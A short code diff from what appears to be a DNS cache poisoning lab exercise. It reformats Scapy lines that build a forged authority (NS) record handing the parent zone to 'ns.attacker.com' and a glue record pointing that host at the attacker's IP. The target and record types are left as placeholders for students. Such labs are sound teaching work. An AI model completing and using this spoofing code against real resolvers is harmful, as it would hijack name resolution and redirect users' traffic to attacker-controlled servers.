@@ -41,11 +41,19 @@ base_pkt = (
         # <--- TASK 2: Claim control of the ENTIRE parent zone
         # HINT 1: You want to hijack 'example.com', not the random subdomain.
         # HINT 2: What is the record type for an Authority Server?
-        ns=DNSRR(rrname="TARGET_DOMAIN_HERE", type='PUT_THE_TYPE_HERE', ttl=86400, rdata="ns.attacker.com"),
+        ns=DNSRR(rrname="TARGET_DOMAIN_HERE", 
+                 type='PUT_THE_TYPE_HERE', 
+                 ttl=86400, 
+                 rdata="ns.attacker.com"
+                 ),
         
         # <--- TASK 3: Map the fake NS to your IP (Glue Record)
         # HINT: What is the record type that maps a name to an IPv4 address?
-        ar=DNSRR(rrname="ns.attacker.com", type='PUT_THE_TYPE_HERE', ttl=86400, rdata=attacker_ip)
+        ar=DNSRR(rrname="ns.attacker.com", 
+                 type='PUT_THE_TYPE_HERE', 
+                 ttl=86400, 
+                 rdata=attacker_ip
+        )
     )
 )
 
